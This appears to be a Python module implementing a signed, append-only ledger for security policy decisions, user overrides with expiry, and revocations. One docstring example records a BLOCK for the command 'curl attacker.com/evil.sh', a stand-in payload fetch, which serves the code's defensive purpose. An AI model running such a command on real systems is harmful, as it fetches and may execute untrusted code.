"""
MVAR Decision Ledger

Append-only ledger for MVAR policy decisions and user overrides.
Uses existing scroll + QSEAL infrastructure from prior MVAR security work.

Architecture:
- Decision Scrolls: BLOCK/STEP_UP/ALLOW decisions (append-only)
- Override Scrolls: User-approved temporary exceptions (TTL-bound)
- Expiry Scrolls: Revocations (append-only, no delete)
- JSONL Storage: One scroll per line (fail-closed reads)
- QSEAL Signatures: Ed25519 or HMAC-SHA256 tamper-evident signing

Security model:
- Target hashing: Store SHA-256[:16] of targets, not raw commands/paths
- Fail-closed verification: Invalid signature = entry ignored
- Mandatory TTL: No permanent allows (default 24h)
- Exact scope matching (Phase 1): tool+action+target_hash

Phase 1 scope (only):
- Exact matching: tool+action+target_hash must all match
- Single TTL: One expiry time per override
- JSONL storage: Sequential scan (no index)
"""

from __future__ import annotations

import hashlib
import json
import logging
import os
import hmac
from datetime import datetime, timezone, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any

try:
    from .qseal import QSealSigner
except ImportError:
    from qseal import QSealSigner

QSEAL_AVAILABLE = True
_LOGGER = logging.getLogger("mvar.decision_ledger")


def generate_signature(payload: dict) -> str:
    """
    Legacy deterministic HMAC-SHA256 signature helper.

    This exists for backward compatibility with historical tests and
    artifacts that used QSEAL_SECRET-based HMAC signatures directly.
    """
    secret = os.getenv("QSEAL_SECRET", "").encode("utf-8")
    payload_json = json.dumps(payload, sort_keys=True, separators=(",", ":"))
    return hmac.new(secret, payload_json.encode("utf-8"), hashlib.sha256).hexdigest()


class MVARDecisionLedger:
    """
    Append-only decision ledger for MVAR policy decisions and overrides.

    Features:
    - Cryptographically-signed scrolls (QSEAL)
    - TTL-bound overrides (no permanent allows)
    - Target hashing (privacy - no raw commands in logs)
    - Fail-closed verification (invalid signature = ignored)
    - Exact scope matching (Phase 1)

    Usage:
        ledger = MVARDecisionLedger()

        # Record a BLOCK decision
        decision_id = ledger.record_decision(
            outcome="BLOCK",
            sink=sink_classification,
            target="curl attacker.com/evil.sh",
            provenance_node_id="node_123",
            evaluation_trace=["UNTRUSTED + CRITICAL = BLOCK"],
            reason="Untrusted provenance at critical sink"
        )

        # User approves override (24h TTL)
        override_id = ledger.create_override(
            original_decision_id=decision_id,
            principal_id="local_install",
            ttl_hours=24
        )

        # Check if override exists
        override = ledger.check_override(sink, target, principal_id="local_install")
        if override:
            # Allow the operation
    """

    def __init__(
        self,
        ledger_path: str = "data/mvar_decisions.jsonl",
        enable_qseal_signing: bool = True
    ):
        """
        Initialize decision ledger.

        Args:
            ledger_path: Path to JSONL ledger file
            enable_qseal_signing: Enable cryptographic signatures via QSealSigner
        """
        self.ledger_path = Path(ledger_path)
        self.ledger_path.parent.mkdir(parents=True, exist_ok=True)
        try:
            os.chmod(self.ledger_path.parent, 0o700)
        except OSError:
            pass

        # QSEAL signing (separate from enable_ledger flag)
        # QSEAL_AVAILABLE is True for both optional external engine and local fallback signer.
        self.enable_qseal_signing = enable_qseal_signing and QSEAL_AVAILABLE
        self.qseal_mode = "none"
        self.max_future_skew_seconds = int(os.getenv("MVAR_MAX_FUTURE_SKEW_SECONDS", "300"))
        self.debug_ledger = os.getenv("MVAR_DEBUG_LEDGER") == "1"
        self.max_ledger_bytes = int(os.getenv("MVAR_LEDGER_MAX_BYTES", str(10 * 1024 * 1024)))
        self.max_appends_per_minute = int(os.getenv("MVAR_LEDGER_MAX_APPENDS_PER_MINUTE", "600"))
        self._append_times: List[datetime] = []
        self._qseal_signer: Optional[QSealSigner] = QSealSigner() if self.enable_qseal_signing else None
        self.qseal_mode = (
            str(self._qseal_signer.algorithm).lower()
            if self._qseal_signer is not None
            else "none"
        )
        self._runtime_profile = str(os.getenv("MVAR_RUNTIME_PROFILE", "")).strip().lower()
        self._require_ed25519 = (
            os.getenv("MVAR_LEDGER_REQUIRE_ED25519", "0") == "1"
            or self._runtime_profile == "prod_locked"
        )
        if self.enable_qseal_signing and self._require_ed25519 and self.qseal_mode != "ed25519":
            raise RuntimeError(
                "Ed25519 signing is required for this runtime profile; "
                "ledger initialization failed closed."
            )
        if self.enable_qseal_signing and self.qseal_mode == "hmac-sha256":
            _LOGGER.warning(
                "Decision ledger using HMAC fallback; signatures are labeled hmac-sha256."
            )

        # Cache for loaded scrolls (avoid repeated file I/O)
        self._scroll_cache: Optional[List[Dict]] = None

    @staticmethod
    def _default_principal_id() -> str:
        return os.getenv(
            "MVAR_PRINCIPAL_ID",
            f"local_install:{hashlib.sha256(str(Path.cwd()).encode('utf-8')).hexdigest()[:12]}",
        )

    def _generate_scroll_id(self, scroll_type: str) -> str:
        """
        Generate unique scroll ID.

        Format: MVAR_{TYPE}_{YYYYMMDDTHHMMSSZ}_{hash8}
        Example: MVAR_DEC_20260224T120000Z_a1b2c3d4

        Args:
            scroll_type: "DEC" | "OVR" | "EXP"

        Returns:
            Unique scroll ID
        """
        now = datetime.now(timezone.utc)
        timestamp = now.strftime("%Y%m%dT%H%M%SZ")
        random_suffix = os.urandom(4).hex()
        return f"MVAR_{scroll_type}_{timestamp}_{random_suffix}"

    def _compute_target_hash(self, target: str) -> str:
        """
        Compute SHA-256[:16] hash of target for privacy.

        We store hashes, not raw targets, to prevent leaking sensitive
        commands/paths in audit logs.

        Args:
            target: Raw target string (command, path, domain)

        Returns:
            16-character hex hash
        """
        return hashlib.sha256(target.encode("utf-8")).hexdigest()[:16]

    def _compute_meta_hash(self, scroll: dict) -> str:
        """
        Compute SHA-256 hash of canonical scroll metadata.

        Args:
            scroll: Scroll dictionary (without meta_hash or qseal_signature)

        Returns:
            64-character hex hash
        """
        # Remove signature fields for canonical hash
        canonical = {k: v for k, v in scroll.items()
                    if k not in ("meta_hash", "qseal_signature", "qseal_verified", "qseal_meta_hash", "qseal_algorithm")}
        canonical_json = json.dumps(canonical, sort_keys=True)
        return hashlib.sha256(canonical_json.encode("utf-8")).hexdigest()

    @staticmethod
    def _canonical_signature(algorithm: str, signature_hex: str) -> str:
        return f"{algorithm}:{signature_hex}"

    @staticmethod
    def _split_signature(signature_value: str, claimed_algorithm: str) -> tuple[str, str]:
        raw = str(signature_value or "").strip()
        if ":" in raw:
            algorithm, signature_hex = raw.split(":", 1)
            return algorithm.strip().lower(), signature_hex.strip()
        return claimed_algorithm, raw

    @staticmethod
    def _signed_payload(scroll: dict) -> bytes:
        signed_portion = {
            k: v
            for k, v in scroll.items()
            if k
            not in ("qseal_signature", "qseal_verified", "qseal_meta_hash", "qseal_algorithm")
        }
        return json.dumps(signed_portion, sort_keys=True, separators=(",", ":")).encode("utf-8")

    def _sign_payload(self, payload: bytes) -> tuple[str, str, bool]:
        if not self.enable_qseal_signing or self._qseal_signer is None:
            return "none", "UNSIGNED", False

        algorithm = str(self._qseal_signer.algorithm).lower()
        if algorithm == "ed25519":
            private_key = getattr(self._qseal_signer, "_private_key", None)
            public_key = getattr(self._qseal_signer, "_public_key", None)
            if private_key is None or public_key is None:
                raise RuntimeError("Ed25519 signer unavailable")
            signature_hex = private_key.sign(payload).hex()
            verified = False
            try:
                public_key.verify(bytes.fromhex(signature_hex), payload)
                verified = True
            except Exception:
                verified = False
            return algorithm, signature_hex, verified

        if algorithm == "hmac-sha256":
            hmac_key = getattr(self._qseal_signer, "_hmac_key", None)
            if hmac_key is None:
                raise RuntimeError("HMAC fallback key unavailable")
            signature_hex = hmac.new(hmac_key, payload, hashlib.sha256).hexdigest()
            return algorithm, signature_hex, True

        raise RuntimeError(f"Unsupported signing algorithm: {algorithm}")

    @staticmethod
    def _generate_nonce() -> str:
        return os.urandom(16).hex()

    def _sign_scroll(self, scroll: dict) -> dict:
        """
        Sign scroll with QSEAL (if enabled).

        Args:
            scroll: Unsigned scroll dictionary

        Returns:
            Signed scroll with qseal_signature field
        """
        if self._scroll_cache is None:
            self._load_scrolls()
        if self._scroll_cache:
            prev_sig = self._scroll_cache[-1].get("qseal_signature")
            if prev_sig:
                scroll["qseal_prev_signature"] = prev_sig

        if not self.enable_qseal_signing:
            scroll["qseal_algorithm"] = "none"
            scroll["qseal_signature"] = "UNSIGNED"
            scroll["qseal_verified"] = False
            return scroll

        # Compute meta_hash before signing
        scroll["meta_hash"] = self._compute_meta_hash(scroll)
        payload = self._signed_payload(scroll)
        algorithm, signature_hex, verified = self._sign_payload(payload)
        scroll["qseal_algorithm"] = algorithm
        scroll["qseal_signature"] = self._canonical_signature(algorithm, signature_hex)
        scroll["qseal_verified"] = bool(verified)

        meta_payload = {"agent_id": "mvar_decision_ledger", "meta_hash": scroll.get("meta_hash", "")}
        meta_payload_json = json.dumps(meta_payload, sort_keys=True, separators=(",", ":")).encode("utf-8")
        if algorithm == "ed25519":
            private_key = getattr(self._qseal_signer, "_private_key", None)
            if private_key is None:
                raise RuntimeError("Ed25519 signer unavailable for meta hash seal")
            meta_sig_hex = private_key.sign(meta_payload_json).hex()
            scroll["qseal_meta_hash"] = self._canonical_signature("ed25519", meta_sig_hex)
        elif algorithm == "hmac-sha256":
            hmac_key = getattr(self._qseal_signer, "_hmac_key", None)
            if hmac_key is None:
                raise RuntimeError("HMAC fallback key unavailable for meta hash seal")
            meta_sig_hex = hmac.new(hmac_key, meta_payload_json, hashlib.sha256).hexdigest()
            scroll["qseal_meta_hash"] = self._canonical_signature("hmac-sha256", meta_sig_hex)
        else:
            scroll["qseal_meta_hash"] = "none:UNSIGNED"
        return scroll

    def _verify_scroll(self, scroll: dict) -> bool:
        """
        Verify scroll signature (fail-closed).

        Args:
            scroll: Signed scroll dictionary

        Returns:
            True if valid, False otherwise
        """
        if not self.enable_qseal_signing:
            return True  # No verification if signing disabled

        if scroll.get("qseal_signature") == "UNSIGNED":
            return False  # Unsigned scrolls not trusted

        try:
            claimed_algorithm = str(scroll.get("qseal_algorithm", "")).strip().lower()
            if claimed_algorithm not in {"ed25519", "hmac-sha256"}:
                return False

            timestamp = scroll.get("timestamp")
            if not timestamp:
                return False
            dt = datetime.fromisoformat(timestamp.replace("Z", "+00:00"))
            now = datetime.now(timezone.utc)
            if (dt - now).total_seconds() > self.max_future_skew_seconds:
                return False

            expected_meta_hash = self._compute_meta_hash(scroll)
            if scroll.get("meta_hash") != expected_meta_hash:
                return False

            # MVAR-specific verification: Exclude fields added AFTER signing
            if "qseal_signature" not in scroll:
                return False

            payload = self._signed_payload(scroll)
            signature_label = str(scroll.get("qseal_signature", ""))
            signature_algorithm, signature_hex = self._split_signature(
                signature_label, claimed_algorithm
            )
            if signature_algorithm != claimed_algorithm or not signature_hex:
                return False

            if claimed_algorithm == "ed25519":
                if self._qseal_signer is None:
                    return False
                public_key = getattr(self._qseal_signer, "_public_key", None)
                if public_key is None:
                    return False
                try:
                    public_key.verify(bytes.fromhex(signature_hex), payload)
                    return True
                except Exception:
                    return False

            # HMAC transition mode:
            # 1) verify against current QSealSigner fallback key when available
            # 2) fallback to legacy QSEAL_SECRET-based verification for historical rows
            if self._qseal_signer is not None:
                hmac_key = getattr(self._qseal_signer, "_hmac_key", None)
                if hmac_key is not None:
                    expected = hmac.new(hmac_key, payload, hashlib.sha256).hexdigest()
                    if hmac.compare_digest(signature_hex, expected):
                        return True

            legacy_secret = os.getenv("QSEAL_SECRET", "").encode("utf-8")
            if legacy_secret:
                expected = hmac.new(legacy_secret, payload, hashlib.sha256).hexdigest()
                if hmac.compare_digest(signature_hex, expected):
                    return True
            return False
        except Exception as e:
            if self.debug_ledger:
                print(f"⚠️  Signature verification failed: {e}")
            return False

    def _append_scroll(self, scroll: dict):
        """
        Append signed scroll to JSONL ledger.

        Args:
            scroll: Signed scroll dictionary
        """
        now = datetime.now(timezone.utc)
        self._append_times = [t for t in self._append_times if (now - t).total_seconds() < 60]
        if len(self._append_times) >= self.max_appends_per_minute:
            raise RuntimeError("Ledger append rate limit exceeded")
        self._append_times.append(now)

        if self.ledger_path.exists() and self.ledger_path.stat().st_size >= self.max_ledger_bytes:
            rotated = self.ledger_path.with_suffix(f".{now.strftime('%Y%m%dT%H%M%SZ')}.jsonl")
            self.ledger_path.rename(rotated)

        with open(self.ledger_path, "a") as f:
            f.write(json.dumps(scroll) + "\n")
        try:
            os.chmod(self.ledger_path, 0o600)
        except OSError:
            pass

        # Invalidate cache
        self._scroll_cache = None

    def _load_scrolls_raw(self) -> List[Dict]:
        """
        Load ALL scrolls from ledger without verification (for testing/auditing).

        Returns:
            List of ALL scrolls (verified and unverified)
        """
        scrolls = []
        if self.ledger_path.exists():
            with open(self.ledger_path, "r") as f:
                for line in f:
                    try:
                        scroll = json.loads(line.strip())
                        scrolls.append(scroll)
                    except json.JSONDecodeError:
                        pass  # Skip malformed lines
        return scrolls

    def _load_scrolls(self, scroll_type: Optional[str] = None) -> List[Dict]:
        """
        Load scrolls from JSONL ledger (with caching).

        Args:
            scroll_type: Filter by scroll_type ("decision" | "override" | "expiry")

        Returns:
            List of verified scrolls
        """
        if self._scroll_cache is None:
            scrolls = []
            seen_scroll_ids = set()
            seen_nonces = set()
            last_signature = None
            if self.ledger_path.exists():
                with open(self.ledger_path, "r") as f:
                    for line_num, line in enumerate(f, 1):
                        try:
                            scroll = json.loads(line.strip())
                            # Fail-closed: Only include verified scrolls
                            if self._verify_scroll(scroll):
                                scroll_id = scroll.get("scroll_id")
                                nonce = scroll.get("nonce") or (f"legacy:{scroll_id}" if scroll_id else None)
                                if not scroll_id or scroll_id in seen_scroll_ids:
                                    if self.debug_ledger:
                                        print(f"⚠️  Skipping replayed/invalid scroll_id at line {line_num}")
                                    continue
                                if not nonce or nonce in seen_nonces:
                                    if self.debug_ledger:
                                        print(f"⚠️  Skipping replayed/invalid nonce at line {line_num}")
                                    continue
                                prev_sig = scroll.get("qseal_prev_signature")
                                if prev_sig and last_signature and prev_sig != last_signature:
                                    if self.debug_ledger:
                                        print(f"⚠️  Skipping broken signature chain at line {line_num}")
                                    continue
                                seen_scroll_ids.add(scroll_id)
                                seen_nonces.add(nonce)
                                scrolls.append(scroll)
                                last_signature = scroll.get("qseal_signature", last_signature)
                            else:
                                if self.debug_ledger:
                                    print(f"⚠️  Skipping unverified scroll at line {line_num}")
                        except json.JSONDecodeError as e:
                            if self.debug_ledger:
                                print(f"⚠️  Skipping malformed line {line_num}: {e}")
            self._scroll_cache = scrolls

        if scroll_type:
            return [s for s in self._scroll_cache if s.get("scroll_type") == scroll_type]
        return self._scroll_cache

    def record_decision(
        self,
        outcome: str,
        sink: Any,  # SinkClassification object
        target: str,
        provenance_node_id: str,
        evaluation_trace: List[str],
        reason: str,
        user_override: bool = False,
        policy_hash: str = "",
        principal_id: Optional[str] = None,
    ) -> str:
        """
        Record a policy decision to the ledger.

        Args:
            outcome: "BLOCK" | "STEP_UP" | "ALLOW"
            sink: SinkClassification object (from sink_policy.py)
            target: Raw target string (will be hashed)
            provenance_node_id: Provenance graph node ID
            evaluation_trace: List of evaluation steps
            reason: Human-readable reason
            user_override: True if decision came from override

        Returns:
            Decision scroll ID (MVAR_DEC_...)
        """
        scroll_id = self._generate_scroll_id("DEC")

        scroll = {
            "scroll_id": scroll_id,
            "scroll_type": "decision",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "nonce": self._generate_nonce(),
            "schema_version": "1.1",
            "decision_outcome": outcome,
            "sink_target": {
                "tool": sink.tool,
                "action": sink.action,
                "target_hash": self._compute_target_hash(target)
            },
            "provenance_node_id": provenance_node_id,
            "principal_id": principal_id or self._default_principal_id(),
            "policy_hash": policy_hash,
            "reason": reason,
            "evaluation_trace": evaluation_trace,
            "user_override": user_override
        }

        # Sign and append
        signed_scroll = self._sign_scroll(scroll)
        self._append_scroll(signed_scroll)

        return scroll_id

    def record_execution_token_nonce_consumed(
        self,
        token: Dict[str, Any],
        tool: str,
        action: str,
        target: str,
        provenance_node_id: str,
        policy_hash: str,
        principal_id: Optional[str] = None,
        parent_decision_id: Optional[str] = None,
    ) -> str:
        """
        Record execution-token nonce consumption as a signed audit scroll.

        This makes one-time token replay revocations tamper-evident and
        linked into the same ledger signature chain as policy decisions.
        """
        scroll_id = self._generate_scroll_id("TOK")
        token_nonce = str(token.get("nonce", ""))
        token_expires_at = str(token.get("expires_at", ""))
        token_payload = {k: v for k, v in token.items() if k != "signature"}
        token_payload_hash = hashlib.sha256(
            json.dumps(token_payload, sort_keys=True, separators=(",", ":")).encode("utf-8")
        ).hexdigest()

        scroll = {
            "scroll_id": scroll_id,
            "scroll_type": "token_nonce",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "nonce": self._generate_nonce(),
            "schema_version": "1.1",
            "principal_id": principal_id or self._default_principal_id(),
            "event": "execution_token_nonce_consumed",
            "parent_decision_id": parent_decision_id or "",
            "token_nonce_hash": hashlib.sha256(token_nonce.encode("utf-8")).hexdigest(),
            "token_payload_hash": token_payload_hash,
            "token_expires_at": token_expires_at,
            "sink_target": {
                "tool": tool,
                "action": action,
                "target_hash": self._compute_target_hash(target),
            },
            "provenance_node_id": provenance_node_id,
            "policy_hash": policy_hash,
        }

        signed_scroll = self._sign_scroll(scroll)
        self._append_scroll(signed_scroll)
        return scroll_id

    def create_override(
        self,
        original_decision_id: str,
        principal_id: Optional[str] = None,
        ttl_hours: int = 24,
        scope: str = "exact"
    ) -> str:
        """
        Create user-approved override for a blocked decision.

        Args:
            original_decision_id: Decision scroll ID to override
            principal_id: Principal identifier (required for multi-principal isolation)
            ttl_hours: Time-to-live in hours (default 24h)
            scope: Matching scope ("exact" only in Phase 1)

        Returns:
            Override scroll ID (MVAR_OVR_...)

        Raises:
            ValueError: If original decision not found or invalid
        """
        # Load original decision
        decisions = self._load_scrolls(scroll_type="decision")
        original = None
        for d in decisions:
            if d["scroll_id"] == original_decision_id:
                original = d
                break

        if not original:
            raise ValueError(f"Decision {original_decision_id} not found")

        # Case-insensitive check (outcome.value stores lowercase)
        outcome_upper = original.get("decision_outcome", "").upper()
        if outcome_upper not in ("BLOCK", "STEP_UP"):
            raise ValueError(f"Can only override BLOCK/STEP_UP decisions, got {original.get('decision_outcome')}")

        if scope != "exact":
            raise ValueError(f"Phase 1 only supports scope='exact', got '{scope}'")

        principal = principal_id or self._default_principal_id()
        decision_principal = original.get("principal_id") or self._default_principal_id()
        if decision_principal != principal:
            raise ValueError(
                f"Decision principal mismatch: decision={decision_principal}, requested={principal}"
            )

        # Generate override scroll
        scroll_id = self._generate_scroll_id("OVR")
        now = datetime.now(timezone.utc)
        expiry = now + timedelta(hours=ttl_hours)

        scroll = {
            "scroll_id": scroll_id,
            "scroll_type": "override",
            "timestamp": now.isoformat(),
            "nonce": self._generate_nonce(),
            "schema_version": "1.1",
            "parent_decision_id": original_decision_id,
            "principal_id": principal,
            "match_criteria": {
                "tool": original["sink_target"]["tool"],
                "action": original["sink_target"]["action"],
                "target_hash": original["sink_target"]["target_hash"],
                "principal_id": principal,
                "scope": scope
            },
            "ttl_expiry": expiry.isoformat(),
            "user_approved": True
        }

        # Sign and append
        signed_scroll = self._sign_scroll(scroll)
        self._append_scroll(signed_scroll)

        return scroll_id

    def check_override(
        self,
        sink: Any,  # SinkClassification object
        target: str,
        principal_id: Optional[str]
    ) -> Optional[Dict]:
        """
        Check if an active override exists for this operation.

        Args:
            sink: SinkClassification object (from sink_policy.py)
            target: Raw target string
            principal_id: Principal identifier (must match override principal)

        Returns:
            Override scroll if match found, None otherwise
        """
        if sink is None:
            return None

        principal = principal_id or self._default_principal_id()
        target_hash = self._compute_target_hash(target)
        now = datetime.now(timezone.utc)

        # Load all overrides
        overrides = self._load_scrolls(scroll_type="override")

        # Load all expiries (revocations)
        expiries = self._load_scrolls(scroll_type="expiry")
        revoked_ids = {e["revoked_override_id"] for e in expiries}

        # Find matching override
        for override in overrides:
            # Skip expired overrides
            expiry_time = datetime.fromisoformat(override["ttl_expiry"].replace("Z", "+00:00"))
            if now >= expiry_time:
                continue

            # Skip revoked overrides
            if override["scroll_id"] in revoked_ids:
                continue

            # Exact scope matching (Phase 1)
            criteria = override["match_criteria"]
            if (criteria["tool"] == sink.tool and
                criteria["action"] == sink.action and
                criteria["target_hash"] == target_hash and
                criteria.get("principal_id", self._default_principal_id()) == principal and
                criteria["scope"] == "exact"):
                return override

        return None

    def expire_override(self, override_id: str) -> str:
        """
        Revoke an override (append expiry scroll).

        Args:
            override_id: Override scroll ID to revoke

        Returns:
            Expiry scroll ID (MVAR_EXP_...)

        Raises:
            ValueError: If override not found
        """
        # Verify override exists
        overrides = self._load_scrolls(scroll_type="override")
        if not any(o["scroll_id"] == override_id for o in overrides):
            raise ValueError(f"Override {override_id} not found")

        # Generate expiry scroll
        scroll_id = self._generate_scroll_id("EXP")

        scroll = {
            "scroll_id": scroll_id,
            "scroll_type": "expiry",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "nonce": self._generate_nonce(),
            "schema_version": "1.1",
            "revoked_override_id": override_id
        }

        # Sign and append
        signed_scroll = self._sign_scroll(scroll)
        self._append_scroll(signed_scroll)

        return scroll_id

    def get_decision(self, decision_id: str) -> Optional[Dict]:
        """
        Get a specific decision by ID.

        Args:
            decision_id: Decision scroll ID

        Returns:
            Decision scroll if found, None otherwise
        """
        decisions = self._load_scrolls(scroll_type="decision")
        for d in decisions:
            if d["scroll_id"] == decision_id:
                return d
        return None

    def load_decisions(self, limit: int = 20) -> List[Dict]:
        """
        Load recent decisions (most recent first).

        Args:
            limit: Maximum number of decisions to return

        Returns:
            List of decision scrolls (most recent first)
        """
        decisions = self._load_scrolls(scroll_type="decision")
        # Reverse for most-recent-first
        return list(reversed(decisions))[:limit]

    def load_overrides(self) -> List[Dict]:
        """
        Load all override scrolls (active and expired).

        Returns:
            List of override scrolls
        """
        return self._load_scrolls(scroll_type="override")
